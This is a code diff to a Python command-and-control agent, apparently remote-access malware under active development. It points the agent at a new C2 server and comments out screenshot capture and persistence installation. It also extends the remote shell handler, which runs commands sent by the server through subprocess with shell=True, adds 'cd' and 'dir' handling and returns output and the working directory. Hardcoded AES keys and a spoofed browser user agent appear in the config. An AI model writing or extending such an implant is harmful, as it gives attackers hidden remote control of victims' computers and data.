@@ -30,7 +30,7 @@ import xml.etree.ElementTree as ET
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://10.10.8.3:443"
+        self.C2_SERVER = "https://192.168.16.78:443"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -637,10 +637,10 @@ class Agent:
                 self._initial_checkin = time.time()
 
         # Send screenshot every 10th checkin
-        if self._checkin_count % 10 == 0:
-            screenshot = SystemUtils.take_screenshot()
-            if screenshot:
-                data["screenshot"] = screenshot
+        #if self._checkin_count % 10 == 0:
+        #    screenshot = SystemUtils.take_screenshot()
+        #    if screenshot:
+        #        data["screenshot"] = screenshot
 
         self._checkin_count += 1
         return data
@@ -649,16 +649,115 @@ class Agent:
         try:
             task_type = task.get("type")
             
-            
             if task_type == "shell":
                 command = task.get("cmd", "")
                 if not command:  # Get command from task_data if not in root
                     task_data = task.get("data", {})
                     command = task_data.get("cmd", "")
-                   
-                print(f"[AGENT] Executing: {command}")  # Debug
                 
-                # Enhanced subprocess execution
+                # Get current directory before executing command
+                current_dir = os.getcwd()
+                
+                # Handle cd command specially
+                if command.lower().startswith("cd "):
+                    new_dir = command[3:].strip()
+                    try:
+                        if new_dir:
+                            # Handle special path cases
+                            if new_dir == "..":
+                                os.chdir("..")
+                            elif new_dir == ".":
+                                pass  # No change
+                            elif new_dir == "\\":
+                                os.chdir("\\")  # Root directory
+                            elif new_dir.startswith("\\"):
+                                os.chdir(new_dir)  # Absolute path
+                            else:
+                                # Handle relative paths
+                                os.chdir(os.path.join(current_dir, new_dir))
+                        
+                        # Get and normalize updated directory
+                        current_dir = os.getcwd()
+                        current_dir = os.path.normpath(current_dir)
+                        
+                        return {
+                            "status": "success",
+                            "output": f"Current directory is now: {current_dir}",
+                            "error": "",
+                            "terminal": True,
+                            "task_id": task.get("task_id"),
+                            "current_dir": current_dir,
+                            "command": command
+                        }
+                    except Exception as e:
+                        return {
+                            "status": "error",
+                            "output": "",
+                            "error": str(e),
+                            "terminal": True,
+                            "task_id": task.get("task_id"),
+                            "current_dir": current_dir,  # Return original directory on error
+                            "command": command
+                        }
+                
+                # Handle dir command specially for Windows-style output
+                if command.strip().lower() == "dir":
+                    try:
+                        dir_output = []
+                        total_files = 0
+                        total_size = 0
+                        dir_count = 0
+                        
+                        # Get directory listing with proper metadata
+                        for item in os.listdir(current_dir):
+                            full_path = os.path.join(current_dir, item)
+                            try:
+                                stat = os.stat(full_path)
+                                
+                                # Format date
+                                mtime = datetime.fromtimestamp(stat.st_mtime)
+                                date_str = mtime.strftime("%d.%m.%Y %H:%M")
+                                
+                                # Format size or DIR marker
+                                if os.path.isdir(full_path):
+                                    size_str = "<DIR>"
+                                    dir_count += 1
+                                else:
+                                    size_str = "{:>15,}".format(stat.st_size).replace(",", " ")
+                                    total_files += 1
+                                    total_size += stat.st_size
+                                
+                                # Format the line
+                                dir_output.append(f"{date_str}  {size_str} {item}")
+                            except:
+                                continue  # Skip files we can't access
+                        
+                        # Add summary line
+                        dir_output.append("")
+                        dir_output.append(f"              {total_files} File(s) {total_size:,} bytes".replace(",", " "))
+                        dir_output.append(f"              {dir_count} Dir(s)")
+                        
+                        return {
+                            "status": "success",
+                            "output": "\n".join(dir_output),
+                            "error": "",
+                            "terminal": True,
+                            "task_id": task.get("task_id"),
+                            "current_dir": current_dir,
+                            "command": command
+                        }
+                    except Exception as e:
+                        return {
+                            "status": "error",
+                            "output": "",
+                            "error": str(e),
+                            "terminal": True,
+                            "task_id": task.get("task_id"),
+                            "current_dir": current_dir,
+                            "command": command
+                        }
+                
+                # For other commands, execute in the current directory
                 result = subprocess.run(
                     command,
                     shell=True,
@@ -667,14 +766,15 @@ class Agent:
                     text=True,
                     encoding='utf-8',
                     errors='replace',
-                    timeout=30
+                    timeout=30,
+                    cwd=current_dir
                 )
                 
                 output = result.stdout.strip()
                 error = result.stderr.strip()
                 
-                print(f"[AGENT] Output: {output}")  # Debug
-                print(f"[AGENT] Error: {error}")    # Debug
+                # Get current directory after command execution
+                current_dir = os.getcwd()
                 
                 if task.get("terminal", False) or task.get("data", {}).get("terminal", False):
                     return {
@@ -682,15 +782,19 @@ class Agent:
                         "output": output if output else "Command executed successfully",
                         "error": error,
                         "terminal": True,
-                        "task_id": task.get("task_id")
+                        "task_id": task.get("task_id"),
+                        "current_dir": current_dir,
+                        "command": command
                     }
                 
                 return {
                     "output": output,
                     "error": error,
-                    "returncode": result.returncode
+                    "returncode": result.returncode,
+                    "current_dir": current_dir,
+                    "command": command
                 }
-                        
+                 
               
 
             
@@ -839,10 +943,10 @@ class Agent:
     def run(self):
         """Main entry point for the agent"""
         print("[*] Checking persistence...")
-        if not getattr(sys, 'frozen', False):
-            print("[*] Installing persistence...")
-            result = Persistence.install()
-            print(f"[*] Persistence result: {result}")
+        #if not getattr(sys, 'frozen', False):
+            #print("[*] Installing persistence...")
+            #result = Persistence.install()
+            #print(f"[*] Persistence result: {result}")
         
         print("[*] Starting beacon...")
         self.beacon()
